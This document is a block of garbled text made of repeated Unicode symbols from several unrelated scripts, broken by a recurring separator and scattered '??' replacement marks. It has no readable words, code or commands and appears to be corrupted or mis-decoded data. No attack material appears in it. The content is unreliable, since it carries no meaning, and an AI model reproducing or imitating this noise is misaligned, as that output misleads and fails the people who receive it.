࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛